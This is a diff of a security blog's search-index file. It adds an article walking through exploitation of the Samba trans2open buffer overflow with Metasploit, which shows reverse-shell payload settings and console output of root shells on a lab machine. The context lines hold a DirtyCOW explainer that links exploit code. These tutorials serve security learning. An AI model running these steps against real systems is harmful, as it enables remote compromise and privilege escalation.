@@ -10,13 +10,6 @@ var relearn_search_index = [
     "content": "",
     "description": "",
     "tags": null,
-    "title": "dirtycow",
-    "uri": "/tags/dirtycow/index.html"
-  },
-  {
-    "content": "",
-    "description": "",
-    "tags": null,
     "title": "exploit",
     "uri": "/tags/exploit/index.html"
   },
@@ -24,8 +17,40 @@ var relearn_search_index = [
     "content": "",
     "description": "",
     "tags": null,
+    "title": "linux",
+    "uri": "/tags/linux/index.html"
+  },
+  {
+    "content": "",
+    "description": "",
+    "tags": null,
+    "title": "samba",
+    "uri": "/tags/samba/index.html"
+  },
+  {
+    "content": "A little about Samba.\nSamba is the standard Windows interoperabiity suite of programs for Linux and Unix. The Samba package provides secure, stable and fast file and print services for all clients such as OS/2, Linux, FreeBSD, using the SMB/CIFS protocol.\nSamba is an important component to seamlessly integrate Linux servers and desktops into a Windows Active Directory environment. It can function both as a domain controller or as a regular domain member.\nIn Samba versions 2.2.0 to 2.2.8a, running on x86 Linux systems that do not have the noexec stack option set, there exists a buffer overflow vulnerability which could lead to remote administrative privilege compromise. This vulnerability could allow a remote attacker to execute arbitrary code on the affected system. The stack overflow error is believed to be in the trans2open() function call.\nThere are at least 3 variants of the trans2open exploit, one written in C and two written in the Perl scripting language.\nSamba trans2open Overflow (Linux x86) - Metasploit\nThere are four metasploit exploit modules, as shown in the screenshot below:\nBasic usage:\nmsf6 \u003e use exploit/linux/samba/trans2open [*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp msf6 exploit(linux/samba/trans2open) \u003e options Module options (exploit/linux/samba/trans2open): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS yes The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/us ing-metasploit.html RPORT 139 yes The target port (TCP) Payload options (linux/x86/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 10.0.2.15 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Samba 2.2.x - Bruteforce View the full module info with the info, or info -d command. We need to set the following options before running the exploit\nRHOSTS → IP Address of the target Linux server LHOST → IP Address of the attacker machine Set the payload with set payload linux/x86/shell_reverse_tcp Once both these options are set, execute the exploit by typing run or exploit.\nMetasploit will run the exploit, and you will get root privileges on the target machine.\n[*] Started reverse TCP handler on 192.168.56.11:4444 [*] 192.168.56.110:139 - Trying return address 0xbffffdfc... [*] 192.168.56.110:139 - Trying return address 0xbffffcfc... [*] 192.168.56.110:139 - Trying return address 0xbffffbfc... [*] 192.168.56.110:139 - Trying return address 0xbffffafc... [*] 192.168.56.110:139 - Trying return address 0xbffff9fc... [*] 192.168.56.110:139 - Trying return address 0xbffff8fc... [*] 192.168.56.110:139 - Trying return address 0xbffff7fc... [*] 192.168.56.110:139 - Trying return address 0xbffff6fc... [*] Command shell session 1 opened (192.168.56.11:4444 -\u003e 192.168.56.110:32773) at 2022-05-24 19:34:58 +0400 [*] Command shell session 2 opened (192.168.56.11:4444 -\u003e 192.168.56.110:32774) at 2022-05-24 19:34:59 +0400 [*] Command shell session 3 opened (192.168.56.11:4444 -\u003e 192.168.56.110:32775) at 2022-05-24 19:35:01 +0400 [*] Command shell session 4 opened (192.168.56.11:4444 -\u003e 192.168.56.110:32776) at 2022-05-24 19:35:02 +0400 id uid=0(root) gid=0(root) groups=99(nobody) Reference Links:\nexploit-db.com\ninfosecmatter.com\nsamba.org\nmetasploit.com\n",
+    "description": "",
+    "tags": [
+      "exploit",
+      "samba",
+      "linux"
+    ],
+    "title": "Samba Trans2open Exploit",
+    "uri": "/exploit-articles/samba-trans2open-exploit/index.html"
+  },
+  {
+    "content": "",
+    "description": "",
+    "tags": null,
     "title": "Tags",
     "uri": "/tags/index.html"
+  },
+  {
+    "content": "",
+    "description": "",
+    "tags": null,
+    "title": "dirtycow",
+    "uri": "/tags/dirtycow/index.html"
   },
   {
     "content": "DirtyCOW (CVE-2016-5195) The DirtyCOW is a vulnerability in the Linux kernel which allowed processes, write access to read only memory mappings. This vulnerability was discovered by Phil Oester.\nThe vulnerability is called DirtyCOW because the issue is caused by a race condition 1 in the way the kernel handles copy-on-write (COW) COW is an optimization strategy used by operating systems. When multiple processes ask for resources, the system can give them pointers to the same resource. This state can be maintained until a program tries to modify its copy of the resource. When processes try to do this, a private copy of the resource is created so that other processes cannot read that data. The Linux kernel’s COW implementation had a flaw which causes a race condition, allowing non-privileged users to alter root owned files. This flaw, effectively gives unprivileged local users write access to otherwise ready only memory mappings and thus elevate their privileges on the affected system.\nThe dirty part of the name comes from the Dirty Bit. A dirty bit or modified bit is a bit that is associated with a block of memory and indicates whether the corresponding block of memory has been modified. The dirty bit is set when the processor writes to (modifies) this memory. The dirty bit indicates that its associated block of memory has been modified and not saved to storage yet.\nWhen a block of memory is to be replaced, its corresponding dirty bit is checked to see if the block needs to be written back to secondary memory before being replaced, or it can simply be removed. Dirty bits are used by CPU cache and page replacement algorithms of operating systems.\nWhile most mainstream systems have been patched, there are several other Linux based embedded devices like access control devices, biometric scanners and employee attendance recording devices that are still vulnerable. Since these devices may not receive security updates, DirtyCOW still is an attack vector where such devices are used. The real risk of the vulnerability is when user level access and code execution ability, exists on the device.\nThe vulnerability was patched in Linux kernel versions 4.8.3, 4.7.9, 4.4.26 and newer. The first patch released in 2016 did not fully address remediation of the issue and a revised patch was released in November 2017, before public disclosure of the vulnerability.\nExploit code for this vulnerability is available on https://www.exploit-db.com/exploits/40839. You might have come across and probably ran this exploit while working vulnhub machines.\nA POC exploit is available on GitHub. This exploit script needs to be compiled and run on the affected system in order for it to work.\nA detection/scanner script for this vulnerability is available on https://access.redhat.com/sites/default/files/rh-cve-2016-5195_1.sh.\nAndroid devices ZINU is the first malware for Android devices, which exploit the DirtyCOW vulnerability. It can be used to root any devices upto Android 7.0 Nougat. According to a report from security vendor TrendMicro, over 300,000 malicious apps carrying ZINU were reported in the wild, as of September 2017. Once the user launches an infected app, ZINU connects to its C\u0026C server, then uses the DirtyCOW exploit to gain root privileges to the device. While the exploit cannot be executed remotely, malicious apps can still plant backdoors and execute remote control attacks.\nReferences https://www.secpod.com/blog/dirty-cow-vulnerability/ A YouTube video explaining the exploit is here. https://www.makeuseof.com/tag/dirty-cow-vulnerability-everything-know/ A race condition occurs when two or more threads can access shared data and they try to change it at the same time. Because the thread scheduling algorithm can swap between threads at any time, you don’t know the order in which the threads will attempt to access the shared data. Therefore, the result of the change in data is dependent on the thread scheduling algorithm, i.e. both threads are “racing” to access/change the data. ↩︎\n",
